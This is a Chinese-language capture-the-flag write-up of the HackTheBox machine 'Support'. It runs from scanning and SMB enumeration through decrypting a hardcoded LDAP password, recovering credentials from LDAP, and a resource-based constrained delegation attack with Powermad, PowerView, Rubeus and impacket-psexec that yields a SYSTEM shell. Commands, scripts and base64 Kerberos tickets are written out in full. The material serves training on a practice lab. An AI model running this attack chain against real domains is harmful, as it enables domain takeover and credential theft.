---
title: Support
pagination_prev: null
pagination_next: null
---

# 端口扫描

## 全端口扫描
~~~
┌──(kali㉿kali)-[~/Support]
└─$ sudo nmap -sT -p- --min-rate 2000 10.10.11.174 -oA nmap/ports
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-14 06:49 EST
Nmap scan report for 10.10.11.174
Host is up (0.073s latency).
Not shown: 65517 filtered tcp ports (no-response)
PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
9389/tcp  open  adws
49664/tcp open  unknown
49667/tcp open  unknown
49678/tcp open  unknown
49701/tcp open  unknown
49739/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 93.01 seconds

~~~
## 默认脚本扫描
~~~
┌──(kali㉿kali)-[~/Support]
└─$ sudo nmap -sT -sV -sC -p 53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,49664,49667,49678,49701,49739  10.10.11.174 -oA nmap/sC
[sudo] password for kali: 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-14 06:56 EST
Nmap scan report for 10.10.11.174
Host is up (0.080s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-01-14 11:41:02Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: support.htb0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: support.htb0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        .NET Message Framing
49664/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49678/tcp open  msrpc         Microsoft Windows RPC
49701/tcp open  msrpc         Microsoft Windows RPC
49739/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2025-01-14T11:41:52
|_  start_date: N/A
|_clock-skew: -15m41s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 98.88 seconds
                                                              

~~~
## 漏洞脚本扫描
~~~
┌──(kali㉿kali)-[~/Support]
└─$ sudo nmap -sT --script=vuln -p 53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,49664,49667,49678,49701,49739  10.10.11.174 -oA nmap/vuln
[sudo] password for kali: 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-14 06:56 EST
Pre-scan script results:
| broadcast-avahi-dos: 
|   Discovered hosts:
|     224.0.0.251
|   After NULL UDP avahi packet DoS (CVE-2011-1002).
|_  Hosts are all up (not vulnerable).
Nmap scan report for 10.10.11.174
Host is up (0.074s latency).

PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
9389/tcp  open  adws
49664/tcp open  unknown
49667/tcp open  unknown
49678/tcp open  unknown
49701/tcp open  unknown
49739/tcp open  unknown

Host script results:
|_smb-vuln-ms10-054: false
|_smb-vuln-ms10-061: Could not negotiate a connection:SMB: Failed to receive bytes: ERROR
|_samba-vuln-cve-2012-1182: Could not negotiate a connection:SMB: Failed to receive bytes: ERROR

Nmap done: 1 IP address (1 host up) scanned in 138.00 seconds


~~~

# 445(SMB)

列出所有共享

~~~
┌──(kali㉿kali)-[~/Support]
└─$ smbclient -L 10.10.11.174
Password for [WORKGROUP\kali]:

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        support-tools   Disk      support staff tools
        SYSVOL          Disk      Logon server share 
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.10.11.174 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available

~~~

有一个UserInfo.exe.zip 看起来比较可疑，下载下来

~~~
┌──(kali㉿kali)-[~/Support]
└─$ smbclient  //10.10.11.174/support-tools -N                                                                         
Try "help" to get a list of possible commands.
smb: \> binary
binary: command not found
smb: \> dir
  .                                   D        0  Wed Jul 20 13:01:06 2022
  ..                                  D        0  Sat May 28 07:18:25 2022
  7-ZipPortable_21.07.paf.exe         A  2880728  Sat May 28 07:19:19 2022
  npp.8.4.1.portable.x64.zip          A  5439245  Sat May 28 07:19:55 2022
  putty.exe                           A  1273576  Sat May 28 07:20:06 2022
  SysinternalsSuite.zip               A 48102161  Sat May 28 07:19:31 2022
  UserInfo.exe.zip                    A   277499  Wed Jul 20 13:01:07 2022
  windirstat1_1_2_setup.exe           A    79171  Sat May 28 07:20:17 2022
  WiresharkPortable64_3.6.5.paf.exe      A 44398000  Sat May 28 07:19:43 2022

                4026367 blocks of size 4096. 967296 blocks available
smb: \> get UserInfo.exe.zip 
getting file \UserInfo.exe.zip of size 277499 as UserInfo.exe.zip (338.7 KiloBytes/sec) (average 338.7 KiloBytes/sec)
smb: \> ^C

~~~

用DNSpy逆向程序，查找ldap查询的有关类，发现硬编码的密码加密逻辑

![](Pasted%20image%2020250117113837.png)

编写解密脚本，得到密码`nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz`

~~~python
import base64

# 与 C# 代码中的 enc_password 相同
enc_password = "0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E"
key = "armando"  # 与 C# 中的 key 相同

# 将密文从 Base64 解码
encoded_bytes = base64.b64decode(enc_password)

# 将 key 转换为字节数组
key_bytes = bytearray(key, 'ascii')

# 创建一个新的字节数组来存储解密后的数据
decrypted_bytes = bytearray(len(encoded_bytes))

# 对每个字节进行解密操作
for i in range(len(encoded_bytes)):
    decrypted_bytes[i] = encoded_bytes[i] ^ key_bytes[i % len(key_bytes)] ^ 223

# 将解密后的字节数组转换为字符串
decrypted_password = decrypted_bytes.decode('utf-8', errors='ignore')  # 处理可能出现的非 UTF-8 字符

# 输出解密结果
print("Decrypted password:", decrypted_password)

~~~

执行程序时，中间停顿了一段时间，应该有网络查询

~~~
(base) PS C:\Users\lizis\Desktop\UserInfo.exe> .\UserInfo.exe user
Unable to parse command 'user' reason: Required option '-username' not found!



Usage: UserInfo.exe [options] [commands]

Options:
  -v|--verbose        Verbose output

Commands:
  find                Find a user
  user                Get information about a user

(base) PS C:\Users\lizis\Desktop\UserInfo.exe> .\UserInfo.exe find
[-] At least one of -first or -last is required.
(base) PS C:\Users\lizis\Desktop\UserInfo.exe> .\UserInfo.exe find -first
Unable to parse command 'find' reason: Unable to parse option '-first' value '' is invalid!



Usage: UserInfo.exe [options] [commands]

Options:
  -v|--verbose        Verbose output

Commands:
  find                Find a user
  user                Get information about a user

(base) PS C:\Users\lizis\Desktop\UserInfo.exe> .\UserInfo.exe find -first 'lizi'
[-] Exception: 该服务器不可操作。

(base) PS C:\Users\lizis\Desktop\UserInfo.exe> .\UserInfo.exe find -first '*'
[-] Exception: 该服务器不可操作。

(base) PS C:\Users\lizis\Desktop\UserInfo.exe>
~~~

把openvpn迁移到宿主机然后再运行程序。使用简单的ldap注入(这段查询在linux上无法运行)

~~~
(base) PS C:\Users\lizis\Desktop\UserInfo.exe> .\UserInfo.exe find -first *
raven.clifton
anderson.damian
monroe.david
cromwell.gerard
west.laura
levine.leopoldo
langley.lucy
daughtler.mabel
bardot.mary
stoll.rachelle
thomas.raphael
smith.rosario
wilson.shelby
hernandez.stanley
ford.victoria
~~~


安装mono。使我们可以在linux中运行.NET程序

~~~
sudo apt install mono-complete
~~~

发现可以正常运行，用winrshark抓包（监听tun0）

~~~
┌──(kali㉿kali)-[~/Support]
└─$ mono UserInfo.exe

Usage: UserInfo.exe [options] [commands]

Options: 
  -v|--verbose        Verbose output                                    

Commands: 
  find                Find a user                                       
  user                Get information about a user                      

          
~~~

![](Pasted%20image%2020250117131011.png)

得到有一个用户ldap，密码是`nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz`，正是我们所破解的密码

靠着这组凭据进行信息搜集

用ldapsearch搜集信息

~~~
ldapsearch -H ldap://support.htb -D 'ldap@support.htb' -w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -b "DC=support,DC=htb"
~~~

![](Pasted%20image%2020250117141705.png)

在info中发现字符串`Ironside47pleasure40Watchful`很可能是用户support的密码

尝试验证凭据，发现winrm可登录

~~~
┌──(kali㉿kali)-[~/Support]
└─$ nxc winrm  support.htb -u support -p 'Ironside47pleasure40Watchful'
WINRM       10.10.11.174    5985   DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:support.htb)
/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from this module in 48.0.0.
  arc4 = algorithms.ARC4(self._key)
WINRM       10.10.11.174    5985   DC               [+] support.htb\support:Ironside47pleasure40Watchful (Pwn3d!)

~~~


在bloodhound中发现SHARED SUPPORT ACCOUNTS这个组对DC有genericall权限，而support这个用户就在SHARED SUPPORT ACCOUNTS组中

~~~
*Evil-WinRM* PS C:\programdata> . .\Powermad.ps1                                                                                                                                                                                                                              
*Evil-WinRM* PS C:\programdata> . .\PowerView.ps1                                                                                                                                                                                                                             
*Evil-WinRM* PS C:\programdata> New-MachineAccount -MachineAccount lizimachine -Password $(ConvertTo-SecureString 'Lzh123456@' -AsPlainText -Force)                                                                                                                           
[+] Machine account lizimachine added                                                                                                                                                                                                                                         
*Evil-WinRM* PS C:\programdata> $ComputerSid = Get-DomainComputer lizimachine -Properties objectsid | Select -Expand objectsid                                                                                                                                                
*Evil-WinRM* PS C:\programdata> $ComputerSid                                                                                                                                                                                                                                  
S-1-5-21-1677581083-3380853377-188903654-5603                                                                                                                                                                                                                                 
*Evil-WinRM* PS C:\programdata> $SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($ComputerSid))"                                                                                                         
*Evil-WinRM* PS C:\programdata> $SDBytes = New-Object byte[] ($SD.BinaryLength)                                                                                                                                                                                               
*Evil-WinRM* PS C:\programdata> $SD.GetBinaryForm($SDBytes, 0)                                                                                                                                                                                                                
*Evil-WinRM* PS C:\programdata> Get-DomainComputer $TargetComputer | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}                                                                                                                             
*Evil-WinRM* PS C:\programdata> .\Rubeus.exe hash /password:Lzh123456@ /user:lizimachine /domain:support.htb                                                                                                                                                                  
                                                                                                                                                                                                                                                                              
   ______        _                                                                                                                                                                                                                                                            
  (_____ \      | |                                                                                                                                                                                                                                                           
   _____) )_   _| |__  _____ _   _  ___                                                                                                                                                                                                                                       
  |  __  /| | | |  _ \| ___ | | | |/___)                                                                                                                                                                                                                                      
  | |  \ \| |_| | |_) ) ____| |_| |___ |                                                                                                                                                                                                                                      
  |_|   |_|____/|____/|_____)____/(___/                                                                                                                                                                                                                                       
                                                                                                                                                                                                                                                                              
  v2.2.0                                                                                                                                                                                                                                                                      
                                                                                                                                                                                                                                                                              
                                                                                                                                                                                                                                                                              
[*] Action: Calculate Password Hash(es)                                                                                                                                                                                                                                       
                                                                                                                                                                                                                                                                              
[*] Input password             : Lzh123456@                                                                                                                                                                                                                                   
[*] Input username             : lizimachine                                                                                                                                                                                                                                  
[*] Input domain               : support.htb                                                                                                                                                                                                                                  
[*] Salt                       : SUPPORT.HTBlizimachine                                                                                                                                                                                                                       
[*]       rc4_hmac             : 48944F471BA838D49AC66D208C72822D                                                                                                                                                                                                             
[*]       aes128_cts_hmac_sha1 : 27976792E4EFF07A45CB7B4DF3CD5EB5                                                                                                                                                                                                             
[*]       aes256_cts_hmac_sha1 : 9C7A1ADBEE8B2B775F18F2EAC673F456D9364EADED066335130833490F99D783                                                                                                                                                                             
[*]       des_cbc_md5          : B015EF01C402AB0D                                                                                                                                                                                                                             
                                                   






*Evil-WinRM* PS C:\programdata> .\Rubeus.exe s4u /user:lizimachine$ /rc4:48944F471BA838D49AC66D208C72822D /impersonateuser:administrator /msdsspn:cifs/dc.support.htb /ptt

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.0

[*] Action: S4U

[*] Using rc4_hmac hash: 48944F471BA838D49AC66D208C72822D
[*] Building AS-REQ (w/ preauth) for: 'support.htb\lizimachine$'
[*] Using domain controller: ::1:88
[+] TGT request successful!
[*] base64(ticket.kirbi):

      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


[*] Action: S4U

[*] Building S4U2self request for: 'lizimachine$@SUPPORT.HTB'
[*] Using domain controller: dc.support.htb (::1)
[*] Sending S4U2self request to ::1:88
[+] S4U2self success!
[*] Got a TGS for 'administrator' to 'lizimachine$@SUPPORT.HTB'
[*] base64(ticket.kirbi):

      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
      MA4bDGxpemltYWNoaW5lJA==

[*] Impersonating user 'administrator' to target SPN 'cifs/dc.support.htb'
[*] Building S4U2proxy request for service: 'cifs/dc.support.htb'
[*] Using domain controller: dc.support.htb (::1)
[*] Sending S4U2proxy request to domain controller ::1:88
[+] S4U2proxy success!
[*] base64(ticket.kirbi) for SPN 'cifs/dc.support.htb':

      doIGaDCCBmSgAwIBBaEDAgEWooIFejCCBXZhggVyMIIFbqADAgEFoQ0bC1NVUFBPUlQuSFRCoiEwH6AD
      AgECoRgwFhsEY2lmcxsOZGMuc3VwcG9ydC5odGKjggUzMIIFL6ADAgESoQMCAQaiggUhBIIFHcUDBmQI
      /V7K8Mht9zNmJSF5t5yCZrTEJ1yDt4P/6SgwNUgSMOuWp8uqJcvMyMbd2csD67kQvLmPgZYc7svlmopz
      FC8ogBa0xVIIsM4FRwcIEeS4KOUlniyoLZptvIUuu2wnEDIqhmV0KqGB55SjTZqO6XBNrYjnsAD/Besd
      taYaknCSNJi3A0v5UQq0r+Wc3fdFu0f37SQFMXg4xMJL9xkVY1lJqtg5Ht1W4bFhWtiYXCmMU+i8a/j2
      0TJ9BcvtZsgZ84qbuZfr09iFIX2SoferxHojsALYZ8GTbSd+ZarvEmt7msczhhwOdDm+DUGKVsoX9/FF
      k5sqq/5+QWoUO3yYfdAPtjZoYwBqggVm0D2zG8Vq4TbIAGFo3ewDeQmDBs2FFVFAsgVJmnZmmfWvNx6S
      Ben1L2S5tvQGZRslYkKmJotAcg031gXjCYPc8U+HDb9/ooe/zVG1994C5dMvDx4GnTx3PKyM5sOryate
      MAhv1VN2GMZNNVdJgmNZAY9dh1AWi0ZmqbAQC/1D1vmTcfFl1jS+yg6CUjqeTa/DeYpkogyvF+qo+G8Q
      ERPLhq9uIgNPcOfa8yQ2UbsYGUHsd2lgca+o7BjNnNZNvFmZGoGQ7g6ia6i6sQTaKuD1zDrnegNyXPP4
      h8zhK4QbwDJAH5jIEzKhJPRbjDNWSQQvU8GQTwSjewjNJSo95my2Bu+WHOBjJuznQVffkRqHxcm4q/Tg
      OIdk6oPJcn2vI8QTrNtt0jVMRGDtobfSdQB5SKr+6ZM0m7D2/3ntKw8sUQ+YQmC+EnTS1HlgRUAtHloC
      mjyLO9vBcHMM984Cc/IRTJ+1ScbrbqvoVTY71bGKVtzqk5h5OMXU1nTBvceR66b2GrV5r89/UFkTGlkI
      c4GdBNadMDrYNdKbAwy+DJ9YGrDcazDLYhx+iVtVTh5tgx1RUsm6PNr8xfBOPGUzk5RFHIag54uD0u0+
      uvuiG88NbNXAmxfDjDBf+pk2DmQBtVyVSoVft8Nn65s16I78optMwZYWyg3DTepzQ6/xqXLyXef5Om21
      iI6ux+LAjcbsjLG2qZl3WWuSENlUM4mF4VCqLmAmJJ18lgL+dfzA60zWoQekoVVqMNaa96X2Ucq5PSXz
      4CbLcJukcqfQNOTlk5K5JhlbDjuFXaycekhM0n7D/+SLZukWXEfKtNWjlH1FitMhZr6w57naIZWSNF3w
      AWhLFZfn3ssTpkyXFxIc9btOucWDI3I8Tm4/Y7LtzEaPC+Wmnfh5FKNsoPrtPLPBkqO4dBp5LXDOHIxj
      bmOba6+A1LgEQfKCSffpCOnZqyxbv6zfjtc2IP4CNZLC/Qdu1sZ5TNFfgLrzpx+59/3pSM4KZ3GKKEYA
      Trhf+j1XOSZFbjie1ajR5fGOuMPxmh05zXvBHbHC2w5BMcJwC1A3Ob6DshhtxpCjqNY0ou4qFN7swqO0
      nh5uycfwEXePJ9QECF3iPdhcxd8ID9Xz3X+L5wiPuZaJTVKk1OYPdaMVCm8mU+GGtsMx15JzzBKEJeQT
      cv1ke30Vg91DWgXzR2XWjCAikd3YhA1v23eSZx/PvDaN84/suoN1DuYbeeofpXYJx74BSq5N35h36My5
      2CHXg4Qq8HzBBRCJNvtUJL5nmRKImJNzakPaU/3xHRQegjhygq6H40mE3acB8XZsI7i5mtf4nkowxcjp
      FMjhYHvl6NXELh77/tldBGxnMZcTKaJx8EPsm7ERYkMp9iuB2AQ/xhVAJgGjgdkwgdagAwIBAKKBzgSB
      y32ByDCBxaCBwjCBvzCBvKAbMBmgAwIBEaESBBAY5FuTQQHqgx8cDgjNiN8hoQ0bC1NVUFBPUlQuSFRC
      ohowGKADAgEKoREwDxsNYWRtaW5pc3RyYXRvcqMHAwUAQKUAAKURGA8yMDI1MDExNzEyMDgxM1qmERgP
      MjAyNTAxMTcyMjA4MTNapxEYDzIwMjUwMTI0MTIwODEzWqgNGwtTVVBQT1JULkhUQqkhMB+gAwIBAqEY
      MBYbBGNpZnMbDmRjLnN1cHBvcnQuaHRi
[+] Ticket successfully imported!

~~~

把得到的最后一个票据base64解密，然后把票据转化为缓存

~~~
┌──(kali㉿kali)-[~/Support]                                                        └─$ vim ticket.kirbi.b64                                                                                                                                              ┌──(kali㉿kali)-[~/Support]                                                        └─$ base64 -d ticket.kirbi.b64 > ticket.kirbi    

┌──(kali㉿kali)-[~/Support]                                                        └─$ impacket-ticketConverter ticket.kirbi ticket.ccache                                                                                                                                                                                     
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies                                                                                                                                                                       
[*] converting kirbi to ccache...                                                                                                                                                                                                           
[+] done                                                                                                                                                      
~~~

利用缓存进行登录
最重要的时间同步！！！

~~~
┌──(kali㉿kali)-[~/Support]
└─$ ntpdate -q 10.10.11.174
2025-01-19 21:38:19.427691 (-0500) -958.937215 +/- 0.063690 10.10.11.174 s1 no-leap
                                                                                                                      
┌──(kali㉿kali)-[~/Support]
└─$ sudo date -s "2025-01-19 21:38:19.427691"
Sun Jan 19 09:38:19 PM EST 2025
                                                                                                                      
┌──(kali㉿kali)-[~/Support]
└─$ KRB5CCNAME=ticket.ccache impacket-psexec support.htb/administrator@dc.support.htb -k -no-pass
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Requesting shares on dc.support.htb.....
[*] Found writable share ADMIN$
[*] Uploading file AcKfshOz.exe
[*] Opening SVCManager on dc.support.htb.....
[*] Creating service zJMa on dc.support.htb.....
[*] Starting service zJMa.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.20348.859]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami
nt authority\system


~~~